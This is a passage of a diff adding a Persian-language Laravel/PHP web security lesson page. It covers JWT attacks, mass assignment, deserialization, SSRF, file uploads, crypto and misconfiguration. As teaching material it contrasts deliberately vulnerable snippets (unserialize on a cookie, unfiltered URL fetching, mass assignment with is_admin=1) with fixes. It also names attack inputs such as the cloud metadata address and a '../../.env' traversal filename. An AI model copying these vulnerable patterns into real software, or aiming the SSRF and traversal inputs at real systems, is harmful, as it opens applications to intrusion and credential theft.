+        Limit::perMinute(5)-&gt;by(Str::lower($request-&gt;input('email')) . '|' . $request-&gt;ip()),
+        Limit::perMinute(30)-&gt;by($request-&gt;ip()),
+    ];
+});
+
+Route::post('/login', [LoginController::class, 'store'])-&gt;middleware('throttle:login');
+
+// LoginController
+public function store(LoginRequest $request)
+{
+    if (! Auth::attempt($request-&gt;only('email', 'password'), $request-&gt;boolean('remember'))) {
+        throw ValidationException::withMessages([
+            'email' =&gt; __('auth.failed'), // پیام عمومی؛ نمی‌گوید کدام اشتباه است
+        ]);
+    }
+
+    $request-&gt;session()-&gt;regenerate(); // جلوگیری از session fixation
+    return redirect()-&gt;intended('/dashboard');
+}
+
+public function destroy(Request $request)
+{
+    Auth::logout();
+    $request-&gt;session()-&gt;invalidate();      // باطل کردن session
+    $request-&gt;session()-&gt;regenerateToken(); // توکن CSRF جدید
+    return redirect('/');
+}</code></pre>
+
+    <h3>تنظیمات کوکی session</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Flag</th><th>کارکرد</th><th>Laravel (<code>config/session.php</code>)</th></tr></thead>
+      <tbody>
+        <tr><td><code>Secure</code></td><td>فقط روی HTTPS ارسال شود</td><td><code>'secure' =&gt; env('SESSION_SECURE_COOKIE')</code></td></tr>
+        <tr><td><code>HttpOnly</code></td><td>از JavaScript قابل خواندن نباشد</td><td><code>'http_only' =&gt; true</code></td></tr>
+        <tr><td><code>SameSite</code></td><td>کنترل ارسال در درخواست‌های cross-site</td><td><code>'same_site' =&gt; 'lax'</code></td></tr>
+        <tr><td>Lifetime</td><td>انقضای بی‌فعالیتی</td><td><code>'lifetime'</code>، <code>'expire_on_close'</code></td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>MFA</h3>
+    <p><strong>Multi-Factor Authentication</strong> یعنی ترکیب حداقل دو عامل از دسته‌های مختلف: <strong>چیزی که می‌دانید</strong> (رمز)، <strong>چیزی که دارید</strong> (گوشی با TOTP، کلید سخت‌افزاری) و <strong>چیزی که هستید</strong> (بیومتریک). TOTP (مثل Google Authenticator) از SMS امن‌تر است (SMS در برابر SIM swap آسیب‌پذیر است). <strong>WebAuthn/Passkey</strong> در برابر phishing مقاوم است چون به origin سایت گره خورده. Laravel Fortify پشتیبانی آماده از 2FA مبتنی بر TOTP و recovery code دارد.</p>
+    <div class="callout exam"><p>سوال «چرا MD5 برای رمز مناسب نیست ولی bcrypt هست؟»: نکته اصلی <strong>سرعت</strong> است. هش رمز باید <strong>عمداً کند</strong> باشد (work factor) تا brute force آفلاین پس از نشت دیتابیس گران شود؛ و <strong>salt</strong> داشته باشد تا rainbow table بی‌اثر شود و دو کاربر با رمز یکسان هش متفاوت داشته باشند. MD5 سریع است و برای این کاربرد طراحی نشده.</p></div>
+  </section>
+
+  <!-- ============ 7. JWT ============ -->
+  <section class="lesson" id="jwt" data-title="JWT و امنیت توکن‌ها">
+    <h2>JWT و امنیت توکن‌ها</h2>
+    <p><strong>JWT</strong> (JSON Web Token) ساختار <code>header.payload.signature</code> دارد که هر بخش <strong>Base64URL-encoded</strong> است. امضا (HMAC مثل HS256 یا امضای نامتقارن مثل RS256/ES256) <strong>یکپارچگی و اصالت</strong> را تضمین می‌کند، نه محرمانگی: payload را هر کسی می‌تواند decode کند.</p>
+    <pre class="diagram">eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOjQyLCJleHAiOjE3...} . SflKxwRJSMeKKF2QT4fwpM...
+      header (alg)            payload (claims)                 signature</pre>
+
+    <h3>اشتباهات و حملات رایج</h3>
+    <ul>
+      <li><strong><code>alg: none</code></strong>: کتابخانه‌هایی که توکن بدون امضا را می‌پذیرند. مقابله: الگوریتم مجاز را <strong>سمت سرور ثابت</strong> کنید و از header توکن نخوانید.</li>
+      <li><strong>Algorithm confusion</strong>: سرور RS256 انتظار دارد ولی مهاجم توکن HS256 می‌سازد و <strong>کلید عمومی</strong> را به‌عنوان secret HMAC استفاده می‌کند. مقابله: allowlist الگوریتم.</li>
+      <li><strong>Secret ضعیف</strong> برای HS256 که با brute force آفلاین شکسته می‌شود. secret باید طولانی و تصادفی باشد.</li>
+      <li>نبود یا نادیده گرفتن <code>exp</code>، و بررسی‌نکردن <code>iss</code>، <code>aud</code> و <code>nbf</code>.</li>
+      <li>قرار دادن <strong>داده حساس</strong> در payload (فقط encode شده است).</li>
+      <li><strong>ابطال (revocation)</strong>: JWT stateless است و تا انقضا معتبر می‌ماند؛ logout یا تغییر رمز آن را باطل نمی‌کند. راه‌حل: عمر کوتاه access token (مثلاً ۵ تا ۱۵ دقیقه) + <strong>refresh token</strong> چرخشی (rotation) ذخیره‌شده سمت سرور، یا denylist بر اساس <code>jti</code>.</li>
+      <li><strong>ذخیره در localStorage</strong>: با هر XSS قابل سرقت است. برای SPA هم‌دامنه، کوکی <code>HttpOnly; Secure; SameSite</code> امن‌تر است (ولی آن‌وقت باید CSRF را مدیریت کنید).</li>
+      <li>اعتماد به headerهای <code>kid</code>، <code>jku</code> یا <code>x5u</code> بدون اعتبارسنجی که به مهاجم اجازه می‌دهد کلید خودش را معرفی کند.</li>
+    </ul>
+
+    <h3>JWT در برابر توکن opaque و session</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>معیار</th><th>Session (کوکی)</th><th>Opaque token (مثل Sanctum)</th><th>JWT</th></tr></thead>
+      <tbody>
+        <tr><td>وضعیت</td><td>stateful (سرور)</td><td>stateful (توکن هش‌شده در DB)</td><td>stateless (خودبسنده)</td></tr>
+        <tr><td>ابطال</td><td>فوری</td><td>فوری (حذف رکورد)</td><td>سخت (تا exp)</td></tr>
+        <tr><td>بررسی</td><td>lookup در store</td><td>lookup در DB</td><td>بررسی امضا بدون DB</td></tr>
+        <tr><td>مناسب برای</td><td>اپ وب سنتی، SPA هم‌دامنه</td><td>موبایل، API اول‌شخص</td><td>معماری توزیع‌شده، SSO، سرویس‌به‌سرویس</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout tip"><p>Laravel <strong>Sanctum</strong> برای API tokenها از توکن‌های opaque استفاده می‌کند و فقط <strong>هش SHA-256</strong> توکن را در جدول <code>personal_access_tokens</code> ذخیره می‌کند؛ پس با نشت دیتابیس، توکن‌ها قابل استفاده نیستند. برای SPA هم‌دامنه، Sanctum از session کوکی + CSRF استفاده می‌کند. <strong>Passport</strong> سرور کامل OAuth2 است و access tokenهایش JWT هستند.</p></div>
+    <div class="callout exam"><p>جمله کلیدی: «JWT <strong>امضا</strong> می‌شود نه <strong>رمزنگاری</strong>؛ امضا جلوی تغییر را می‌گیرد نه خواندن را. اگر محرمانگی لازم است از JWE استفاده کنید یا داده را در توکن نگذارید.» و «stateless بودن JWT مزیت مقیاس‌پذیری و عیب ابطال‌ناپذیری دارد.»</p></div>
+  </section>
+
+  <!-- ============ 8. Mass assignment & deserialization ============ -->
+  <section class="lesson" id="mass-assignment" data-title="Mass Assignment و Insecure Deserialization">
+    <h2>Mass Assignment و Insecure Deserialization</h2>
+
+    <h3>Mass Assignment</h3>
+    <p>وقتی همه فیلدهای ورودی کاربر مستقیماً به مدل نسبت داده می‌شوند، مهاجم می‌تواند فیلدهایی را که در فرم نبوده‌اند (مثل <code>is_admin</code>، <code>balance</code>، <code>role</code>) به درخواست اضافه کند. این یک نوع Broken Access Control در سطح فیلد است (در OWASP API Security Top 10 نسخه 2019 آیتم مستقل Mass Assignment بود و در نسخه 2023 زیر Broken Object Property Level Authorization قرار گرفت).</p>
+    <pre><code class="language-php">&lt;?php
+// نادرست
+$user-&gt;update($request-&gt;all());       // POST: name=Ali&amp;is_admin=1
+
+final class User extends Model
+{
+    protected $guarded = [];          // نادرست: همه فیلدها قابل پرشدن
+}
+
+// درست: allowlist در مدل
+final class User extends Model
+{
+    protected $fillable = ['name', 'email', 'avatar'];
+}
+
+// درست‌تر: فقط داده اعتبارسنجی‌شده
+$user-&gt;update($request-&gt;validated());
+// یا صریح
+$user-&gt;update($request-&gt;safe()-&gt;only(['name', 'avatar']));
+
+// فیلدهای حساس فقط با کد صریح و پس از بررسی مجوز
+Gate::authorize('promote', $user);
+$user-&gt;forceFill(['is_admin' =&gt; true])-&gt;save();</code></pre>
+    <ul>
+      <li><code>$fillable</code> (allowlist) از <code>$guarded</code> (denylist) امن‌تر است چون فیلد جدید به‌طور پیش‌فرض محافظت‌شده است.</li>
+      <li><code>forceFill</code> و <code>Model::unguard()</code> محافظت را دور می‌زنند؛ فقط با داده مورد اعتماد.</li>
+      <li><code>Model::preventSilentlyDiscardingAttributes()</code> در محیط توسعه باعث می‌شود فیلدهای غیر fillable به‌جای نادیده‌گرفته‌شدن بی‌صدا، exception بدهند و باگ زود دیده شود.</li>
+      <li>سمت خروجی هم مراقب باشید: <code>$hidden</code> یا بهتر، <strong>API Resource</strong> صریح تا <code>password</code>، توکن‌ها یا فیلدهای داخلی در JSON لو نروند (Excessive Data Exposure).</li>
+    </ul>
+
+    <h3>Insecure Deserialization</h3>
+    <p><code>unserialize()</code> در PHP می‌تواند <strong>اشیای هر کلاسی</strong> را بازسازی کند و متدهای جادویی (<code>__wakeup</code>، <code>__destruct</code>، <code>__toString</code>) آنها به‌طور خودکار اجرا می‌شوند. مهاجم با ساختن رشته serialize‌شده از کلاس‌های موجود در پروژه و vendor، یک زنجیره (<strong>POP chain / gadget chain</strong>) می‌سازد که به خواندن/نوشتن فایل یا <strong>اجرای کد از راه دور (RCE)</strong> می‌رسد. ابزارهایی مثل PHPGGC زنجیره‌های آماده برای فریم‌ورک‌های رایج دارند.</p>
+    <pre><code class="language-php">&lt;?php
+// نادرست
+$prefs = unserialize($_COOKIE['prefs']);
+
+// درست: فرمت داده‌ای بدون رفتار
+$prefs = json_decode($request-&gt;cookie('prefs'), true, 512, JSON_THROW_ON_ERROR);
+
+// اگر ناچارید: محدود کردن کلاس‌ها
+$data = unserialize($payload, ['allowed_classes' =&gt; false]);</code></pre>
+    <ul>
+      <li>داده serialize‌شده‌ای که از کلاینت برمی‌گردد را <strong>امضا (HMAC)</strong> یا رمزنگاری کنید و قبل از deserialize امضا را بررسی کنید.</li>
+      <li>Laravel کوکی‌ها را با <code>APP_KEY</code> رمزنگاری و MAC می‌کند؛ به همین دلیل <strong>نشت <code>APP_KEY</code></strong> بحرانی است: مهاجم می‌تواند داده رمزنگاری‌شده و signed URL جعل کند و در ترکیب با deserialization به RCE برسد. اگر نشت کرد: فوراً <code>php artisan key:generate</code>، با در نظر داشتن داده‌های رمزنگاری‌شده موجود (Laravel 11+ از <code>APP_PREVIOUS_KEYS</code> برای چرخش تدریجی پشتیبانی می‌کند).</li>
+      <li>دسته A08 فقط deserialization نیست: <strong>یکپارچگی نرم‌افزار</strong> هم هست؛ استفاده از CDN بدون <strong>Subresource Integrity</strong>، pipeline CI/CD بدون کنترل دسترسی، پکیج‌های بدون بررسی و auto-update بدون امضا.</li>
+    </ul>
+    <div class="callout exam"><p>چرا JSON امن‌تر از <code>serialize</code> است؟ چون <code>json_decode</code> فقط <strong>داده</strong> (آرایه، رشته، عدد) تولید می‌کند و هیچ کلاسی را نمونه‌سازی نمی‌کند، پس هیچ متد جادویی اجرا نمی‌شود. اصل کلی: <strong>هرگز داده غیرقابل‌اعتماد را به مکانیزمی که می‌تواند کد یا شیء بسازد ندهید.</strong></p></div>
+  </section>
+
+  <!-- ============ 9. SSRF & uploads ============ -->
+  <section class="lesson" id="ssrf-uploads" data-title="SSRF و امنیت آپلود فایل">
+    <h2>SSRF و امنیت آپلود فایل</h2>
+
+    <h3>Server-Side Request Forgery</h3>
+    <p>SSRF وقتی رخ می‌دهد که سرور به درخواست کاربر، به یک <strong>URL دلخواه</strong> درخواست بفرستد (پیش‌نمایش لینک، import از URL، webhook، دریافت آواتار). مهاجم از سرور به‌عنوان <strong>پراکسی</strong> برای دسترسی به منابعی استفاده می‌کند که از بیرون در دسترس نیستند:</p>
+    <ul>
+      <li><strong>Cloud metadata</strong>: <code>http://169.254.169.254/</code> که در برخی پیکربندی‌ها credential موقت IAM را برمی‌گرداند.</li>
+      <li>سرویس‌های داخلی: <code>http://localhost:6379</code> (Redis)، پنل‌های ادمین داخلی، Elasticsearch.</li>
+      <li>اسکن شبکه داخلی و پورت‌ها؛ استفاده از schemeهای دیگر (<code>file://</code>، <code>gopher://</code>).</li>
+    </ul>
+    <pre><code class="language-php">&lt;?php
+// نادرست
+$image = Http::get($request-&gt;input('avatar_url'))-&gt;body();
+
+// بهتر
+final class SafeUrlFetcher
+{
+    private const ALLOWED_HOSTS = ['cdn.partner.example', 'images.example.com'];
+
+    public function fetch(string $url): string
+    {
+        $parts = parse_url($url);
+        if (($parts['scheme'] ?? null) !== 'https' || ! in_array($parts['host'] ?? '', self::ALLOWED_HOSTS, true)) {
+            throw new UnsafeUrl($url);
+        }
+
+        // اگر allowlist ممکن نیست: IP نهایی را resolve و رنج‌های خصوصی را رد کنید
+        $ip = gethostbyname($parts['host']);
+        if (! filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+            throw new UnsafeUrl($url);
+        }
+
+        return Http::timeout(5)
+            -&gt;withOptions(['allow_redirects' =&gt; false]) // redirect به آدرس داخلی را ببندید
+            -&gt;get($url)
+            -&gt;throw()
+            -&gt;body();
+    }
+}</code></pre>
+    <ul>
+      <li><strong>Allowlist</strong> دامنه‌ها بهترین دفاع است؛ denylist به‌راحتی دور زده می‌شود (نمایش‌های مختلف IP مثل <code>2130706433</code>، IPv6، DNSهایی که به 127.0.0.1 resolve می‌شوند).</li>
+      <li><strong>DNS rebinding</strong>: بین بررسی و درخواست، DNS به IP دیگری resolve شود؛ در صورت امکان به همان IP بررسی‌شده متصل شوید.</li>
+      <li>لایه شبکه: <strong>egress filtering</strong>، اجرای fetcher در شبکه ایزوله، و در AWS استفاده از <strong>IMDSv2</strong> که نیاز به توکن session دارد.</li>
+      <li>پاسخ خام سرویس داخلی را به کاربر برنگردانید (جلوگیری از SSRF با خروجی قابل مشاهده).</li>
+    </ul>
+
+    <h3>امنیت آپلود فایل</h3>
+    <p>ریسک‌ها: آپلود <strong>web shell</strong> (<code>shell.php</code>) و اجرای آن، <strong>XSS</strong> با فایل HTML یا SVG، <strong>path traversal</strong> با نام فایل <code>../../.env</code>، DoS با فایل‌های بسیار بزرگ یا decompression bomb، و فایل‌های <strong>polyglot</strong> (هم تصویر معتبر و هم کد PHP).</p>
+    <pre><code class="language-php">&lt;?php
+use Illuminate\Validation\Rules\File;
+
+$request-&gt;validate([
+    'avatar' =&gt; ['required', File::image()-&gt;max(2 * 1024)],            // KB
+    'doc'    =&gt; ['required', File::types(['pdf', 'docx'])-&gt;max(10 * 1024)],
+]);
+
+// نام تصادفی (hashName) تولید می‌شود؛ هرگز getClientOriginalName را مسیر نکنید
+// 'private' = یک disk غیرعمومی تعریف‌شده در config/filesystems.php
+$path = $request-&gt;file('doc')-&gt;store('documents', 'private');
+
+// تحویل از طریق controller با بررسی مجوز
+public function download(Document $document)
+{
+    Gate::authorize('view', $document);
+    return Storage::disk('private')-&gt;download($document-&gt;path, $document-&gt;display_name);
+}</code></pre>
+    <ul>
+      <li>اعتبارسنجی بر اساس <strong>محتوا (MIME واقعی)</strong>، نه فقط پسوند یا هدر <code>Content-Type</code> که کلاینت می‌فرستد؛ قوانین <code>mimes</code>/<code>image</code> در Laravel MIME را از محتوای فایل حدس می‌زنند.</li>
+      <li>allowlist پسوند و نوع؛ محدودیت اندازه در سه سطح: validation، <code>upload_max_filesize</code>/<code>post_max_size</code> در PHP، و <code>client_max_body_size</code> در Nginx.</li>
+      <li>ذخیره <strong>بیرون از document root</strong> یا روی object storage؛ اگر روی <code>public</code> است، اجرای PHP در آن مسیر را در وب‌سرور ببندید.</li>
+      <li>پردازش مجدد تصاویر (re-encode/resize) که metadata و payloadهای پنهان را حذف می‌کند.</li>
+      <li>SVG و HTML را به‌عنوان فایل فعال در نظر بگیرید؛ یا ممنوع کنید یا با <code>Content-Disposition: attachment</code> و از دامنه جدا سرو کنید.</li>
+      <li>در صورت نیاز اسکن بدافزار (ClamAV) به‌صورت async در Job.</li>
+    </ul>
+    <pre><code class="language-nginx"># جلوگیری از اجرای اسکریپت در مسیر آپلود
+location ^~ /storage/ {
+    location ~ \.php$ { deny all; }
+}</code></pre>
+    <div class="callout exam"><p>در سوال آپلود فایل حتماً این پنج مورد را بنویسید: <strong>validation محتوا‌محور با allowlist</strong>، <strong>محدودیت اندازه</strong>، <strong>نام تصادفی سمت سرور</strong>، <strong>ذخیره خارج از web root و غیرقابل اجرا</strong>، و <strong>تحویل با بررسی مجوز</strong>.</p></div>
+  </section>
+
+  <!-- ============ 10. Crypto ============ -->
+  <section class="lesson" id="crypto" data-title="Encryption، Hashing، Encoding و TLS">
+    <h2>Encryption، Hashing، Encoding و TLS</h2>
+    <p>سه مفهومی که اغلب با هم اشتباه گرفته می‌شوند و سوال مقایسه‌ای کلاسیک آزمون‌اند. ریشه دسته A02 (Cryptographic Failures) معمولاً انتخاب ابزار اشتباه از میان همین سه است.</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>معیار</th><th>Encoding</th><th>Hashing</th><th>Encryption</th></tr></thead>
+      <tbody>
+        <tr><td>هدف</td><td>تغییر قالب برای انتقال/سازگاری</td><td>اثر انگشت یکتا؛ integrity یا ذخیره رمز</td><td><strong>محرمانگی</strong> (confidentiality)</td></tr>
+        <tr><td>برگشت‌پذیر؟</td><td>بله، بدون کلید</td><td><strong>خیر</strong> (یک‌طرفه)</td><td>بله، فقط با کلید</td></tr>
+        <tr><td>کلید</td><td>ندارد</td><td>ندارد (HMAC کلید دارد)</td><td>دارد</td></tr>
+        <tr><td>امنیت</td><td><strong>هیچ</strong></td><td>بستگی به الگوریتم و کاربرد</td><td>بستگی به الگوریتم و مدیریت کلید</td></tr>
+        <tr><td>مثال</td><td>Base64، URL encoding، UTF-8، HTML entities</td><td>SHA-256 (integrity)، bcrypt/Argon2id (رمز)</td><td>AES-256-GCM (متقارن)، RSA/ECC (نامتقارن)</td></tr>
+        <tr><td>Laravel</td><td><code>base64_encode</code>، <code>e()</code></td><td><code>Hash::make</code>، <code>hash('sha256', …)</code></td><td><code>Crypt::encryptString</code>، cast <code>encrypted</code></td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>مفاهیم تکمیلی</h3>
+    <dl class="terms">
+      <dt>Symmetric</dt><dd>یک کلید برای رمزنگاری و رمزگشایی (AES)؛ سریع، ولی توزیع کلید چالش است.</dd>
+      <dt>Asymmetric</dt><dd>جفت کلید عمومی/خصوصی (RSA، ECC)؛ برای تبادل کلید و امضای دیجیتال. کند است، پس در عمل برای تبادل کلید متقارن استفاده می‌شود (مثل TLS).</dd>
+      <dt>HMAC</dt><dd>هش کلیددار برای <strong>یکپارچگی + اصالت</strong> پیام (امضای webhook، signed URL، کوکی).</dd>
+      <dt>Digital Signature</dt><dd>امضا با کلید خصوصی و بررسی با کلید عمومی؛ اصالت، یکپارچگی و انکارناپذیری.</dd>
+      <dt>AEAD</dt><dd>رمزنگاری احراز هویت‌شده (مثل AES-GCM) که محرمانگی و یکپارچگی را با هم می‌دهد.</dd>
+    </dl>
+    <pre><code class="language-php">&lt;?php
+use Illuminate\Support\Facades\Crypt;
+
+$cipher = Crypt::encryptString($nationalId);   // با APP_KEY؛ شامل IV و MAC
+$plain  = Crypt::decryptString($cipher);       // در صورت دستکاری DecryptException
+
+// رمزنگاری خودکار ستون در مدل
+protected function casts(): array
+{
+    return [
+        'national_id' =&gt; 'encrypted',
+        'bank_info'   =&gt; 'encrypted:array',
+    ];
+}
+
+// امضای webhook دریافتی
+$expected = hash_hmac('sha256', $request-&gt;getContent(), config('services.partner.secret'));
+abort_unless(hash_equals($expected, (string) $request-&gt;header('X-Signature')), 401);
+
+// Signed URL (HMAC با APP_KEY)
+$url = URL::temporarySignedRoute('unsubscribe', now()-&gt;addDays(7), ['user' =&gt; $user-&gt;id]);
+Route::get('/unsubscribe/{user}', UnsubscribeController::class)
+    -&gt;name('unsubscribe')-&gt;middleware('signed');</code></pre>
+    <div class="callout warn"><p>اشتباهات رایج: «رمزنگاری» رمز عبور به‌جای هش؛ Base64 کردن داده و آن را «رمزشده» دانستن؛ نوشتن الگوریتم رمزنگاری دست‌ساز؛ استفاده از حالت <strong>ECB</strong>؛ IV ثابت یا تکراری؛ <code>rand()</code> یا <code>mt_rand()</code> برای توکن امنیتی (به‌جایش <code>random_bytes()</code>، <code>random_int()</code> یا <code>Str::random()</code>)؛ و hardcode کردن کلید در کد. همچنین ستون‌های <code>encrypted</code> قابل جست‌وجو با <code>WHERE</code> نیستند.</p></div>
+
+    <h3>HTTPS و TLS</h3>
+    <ul>
+      <li>TLS سه چیز می‌دهد: <strong>محرمانگی</strong> (رمزنگاری کانال)، <strong>یکپارچگی</strong> و <strong>احراز هویت سرور</strong> (گواهی امضاشده توسط CA). جلوی شنود و MITM را می‌گیرد.</li>
+      <li>فقط <strong>TLS 1.2 و 1.3</strong>؛ SSLv3، TLS 1.0 و 1.1 غیرفعال. cipher suiteهای مدرن با <strong>forward secrecy</strong> (ECDHE).</li>
+      <li><strong>HSTS</strong> تا مرورگر هرگز با HTTP وصل نشود و حمله SSL stripping بی‌اثر شود.</li>
+      <li>پشت load balancer: <code>$middleware-&gt;trustProxies(at: [...])</code> در Laravel 11 تا <code>X-Forwarded-Proto</code> درست تشخیص داده شود و URLها HTTPS ساخته شوند؛ در صورت نیاز <code>URL::forceScheme('https')</code>.</li>
+      <li>در درخواست‌های خروجی هرگز اعتبارسنجی گواهی را خاموش نکنید (<code>Http::withoutVerifying()</code> یا <code>'verify' =&gt; false</code> در production).</li>
+      <li>رمزنگاری <strong>at rest</strong> هم لازم است: دیسک/دیتابیس رمزشده، بکاپ‌های رمزشده، و رمزنگاری سطح فیلد برای داده‌های خیلی حساس.</li>
+    </ul>
+    <div class="callout exam"><p>پاسخ نمونه برای «تفاوت Encoding، Hashing و Encryption»: Encoding برای <strong>سازگاری</strong> است و امنیتی نمی‌دهد؛ Hashing <strong>یک‌طرفه</strong> و برای integrity و ذخیره رمز است (برای رمز باید کند و salted باشد)؛ Encryption <strong>دوطرفه با کلید</strong> و برای محرمانگی است. سپس یک مثال از هر کدام و یک اشتباه رایج (Base64 به‌عنوان رمزنگاری، یا encrypt کردن رمز عبور).</p></div>
+  </section>
+
+  <!-- ============ 11. Misconfiguration, secrets, deps ============ -->
+  <section class="lesson" id="misconfig-secrets" data-title="Misconfiguration، Secrets و وابستگی‌ها">
+    <h2>Misconfiguration، Secrets و وابستگی‌ها</h2>
+
+    <h3>Security Misconfiguration (A05)</h3>
+    <ul>
+      <li><strong><code>APP_DEBUG=true</code> در production</strong>: صفحه خطای دیباگ stack trace، کوئری‌ها، مسیر فایل‌ها و در مواردی متغیرهای محیطی (کلیدها و رمز دیتابیس) را نشان می‌دهد. همیشه <code>APP_ENV=production</code> و <code>APP_DEBUG=false</code>.</li>
+      <li><strong><code>.env</code> یا <code>.git</code> قابل دانلود</strong>: اگر document root وب‌سرور به جای <code>public/</code> روی ریشه پروژه باشد، <code>https://site/.env</code> همه secretها را لو می‌دهد. document root باید فقط <code>public/</code> باشد و دسترسی به فایل‌های نقطه‌دار مسدود شود.</li>
+      <li><strong>ابزارهای توسعه باز</strong>: Telescope، Horizon، Debugbar، <code>phpinfo()</code>، phpMyAdmin بدون محافظت. Telescope و Horizon در production با Gate (<code>viewTelescope</code>، <code>viewHorizon</code>) محدود شوند یا نصب نشوند (<code>--dev</code>).</li>
+      <li>رمزهای پیش‌فرض، پورت‌های باز غیرضروری (Redis/MySQL روی اینترنت بدون رمز)، directory listing، نسخه افشاشده سرور (<code>expose_php = Off</code>، <code>server_tokens off;</code>).</li>
+      <li>نبود هدرهای امنیتی، CORS بیش از حد باز، S3 bucket عمومی.</li>
+      <li><strong>XXE</strong>: پردازش XML با entity خارجی فعال که به خواندن فایل یا SSRF می‌رسد؛ در libxml نسخه 2.9 به بعد (که PHP 8 از آن استفاده می‌کند) بارگذاری entity خارجی به‌طور پیش‌فرض غیرفعال است و به همین دلیل <code>libxml_disable_entity_loader()</code> در PHP 8 منسوخ شد. هرگز <code>LIBXML_NOENT</code> را روی XML غیرقابل‌اعتماد فعال نکنید.</li>
+    </ul>
+    <pre><code class="language-nginx">server {
+    listen 443 ssl http2;
+    server_name example.com;
+    root /var/www/app/public;          # فقط public/
+    server_tokens off;
+
+    location ~ /\.(?!well-known) {     # .env، .git و …
+        deny all;
+    }
+
+    location / {
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+}</code></pre>
+    <pre><code class="language-bash"># چک‌لیست deploy در Laravel
+php artisan config:cache
+php artisan route:cache
+php artisan view:cache
+composer install --no-dev --optimize-autoloader</code></pre>
+
+    <h3>مدیریت Secretها</h3>
+    <ul>
+      <li>secret هرگز در کد یا مخزن git نباشد؛ فقط <code>.env.example</code> بدون مقدار واقعی commit شود و <code>.env</code> در <code>.gitignore</code>.</li>
+      <li>تزریق از محیط: متغیرهای محیطی CI/CD، Docker/Kubernetes Secrets، یا <strong>Secret Manager</strong> (HashiCorp Vault، AWS Secrets Manager) با کنترل دسترسی و audit log.</li>
+      <li>Laravel: <code>php artisan env:encrypt</code> فایل <code>.env.encrypted</code> می‌سازد که می‌توان commit کرد و کلیدش جدا (مثلاً <code>LARAVEL_ENV_ENCRYPTION_KEY</code>) در محیط deploy نگه‌داری می‌شود.</li>
+      <li><strong>Rotation</strong> دوره‌ای و فوری پس از نشت؛ secret لو رفته در تاریخچه git با حذف فایل پاک نمی‌شود و باید <strong>باطل و عوض شود</strong>.</li>
+      <li>اسکن خودکار مخزن (gitleaks، trufflehog، GitHub secret scanning) و pre-commit hook.</li>
+      <li>secretها را لاگ نکنید؛ PHP 8.2 attribute <code>#[\SensitiveParameter]</code> مقدار پارامتر را در stack trace پنهان می‌کند.</li>
+      <li>کلید جدا برای هر محیط (dev/staging/prod) و هر سرویس، با حداقل دسترسی.</li>
+    </ul>
+
+    <h3>وابستگی‌های آسیب‌پذیر (A06)</h3>
+    <ul>
+      <li><code>composer audit</code> (از Composer 2.4) پکیج‌های نصب‌شده را با پایگاه advisoryها مقایسه می‌کند؛ در CI اجرا شود تا build در صورت آسیب‌پذیری شکست بخورد. معادل فرانت: <code>npm audit</code>.</li>
+      <li><strong>Dependabot</strong> یا Renovate برای PR خودکار به‌روزرسانی.</li>
+      <li><code>composer.lock</code> را commit کنید و در production <code>composer install</code> (نه <code>update</code>) بزنید تا نسخه‌ها دقیقاً همان تست‌شده‌ها باشند.</li>
+      <li>نسخه PHP، Laravel و سیستم‌عامل را در بازه پشتیبانی امنیتی نگه دارید.</li>
+      <li>حذف پکیج‌های بلااستفاده (کاهش attack surface)؛ دقت به <strong>typosquatting</strong> و پکیج‌های کم‌اعتبار؛ تهیه <strong>SBOM</strong> برای شناخت دقیق زنجیره تأمین.</li>
+    </ul>
+    <pre><code class="language-yaml"># GitHub Actions — بخشی از pipeline
+- name: Install dependencies
+  run: composer install --no-interaction --prefer-dist
+- name: Security audit
+  run: composer audit --no-dev</code></pre>
+    <div class="callout exam"><p>اگر پرسیدند «<code>.env</code> شما در گیت‌هاب عمومی push شده؛ چه می‌کنید؟»: (۱) <strong>فوراً همه secretها را باطل و عوض کنید</strong> (APP_KEY، رمز DB، کلیدهای API)، (۲) لاگ‌ها را برای استفاده مشکوک بررسی کنید، (۳) فایل را از تاریخچه پاک کنید (ولی فرض کنید قبلاً کپی شده)، (۴) secret scanning و pre-commit hook راه بیندازید، (۵) به سمت secret manager بروید. حذف فایل در commit بعدی <strong>کافی نیست</strong>.</p></div>
+  </section>
+
+  <!-- ============ 12. Headers & CORS ============ -->
+  <section class="lesson" id="headers-cors" data-title="Security Headers و CORS">
+    <h2>Security Headers و CORS</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>هدر</th><th>مقدار پیشنهادی</th><th>محافظت در برابر</th></tr></thead>
+      <tbody>
+        <tr><td><code>Strict-Transport-Security</code></td><td><code>max-age=31536000; includeSubDomains</code></td><td>SSL stripping، اتصال HTTP؛ فقط روی پاسخ HTTPS معنا دارد</td></tr>
+        <tr><td><code>Content-Security-Policy</code></td><td><code>default-src 'self'; script-src 'self' 'nonce-…'; frame-ancestors 'none'</code></td><td>XSS، تزریق منبع، clickjacking</td></tr>
+        <tr><td><code>X-Frame-Options</code></td><td><code>DENY</code> یا <code>SAMEORIGIN</code></td><td>Clickjacking (قدیمی‌تر از <code>frame-ancestors</code>)</td></tr>
+        <tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>MIME sniffing (اجرای فایل متنی به‌عنوان اسکریپت)</td></tr>
+        <tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code></td><td>نشت URL (و توکن‌های داخل آن) به سایت‌های دیگر</td></tr>
+        <tr><td><code>Permissions-Policy</code></td><td><code>camera=(), microphone=(), geolocation=()</code></td><td>سوءاستفاده از APIهای مرورگر</td></tr>
+        <tr><td><code>Cache-Control</code></td><td><code>no-store</code> برای صفحات حساس</td><td>ذخیره داده حساس در cache مرورگر/پراکسی</td></tr>
+      </tbody>
+    </table></div>
+    <pre><code class="language-php">&lt;?php
+final class SecurityHeaders
+{
+    public function handle(Request $request, Closure $next): Response
+    {
+        $response = $next($request);
+
+        $response-&gt;headers-&gt;set('X-Content-Type-Options', 'nosniff');
+        $response-&gt;headers-&gt;set('X-Frame-Options', 'DENY');
+        $response-&gt;headers-&gt;set('Referrer-Policy', 'strict-origin-when-cross-origin');
+        $response-&gt;headers-&gt;set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
+
+        if ($request-&gt;isSecure()) {
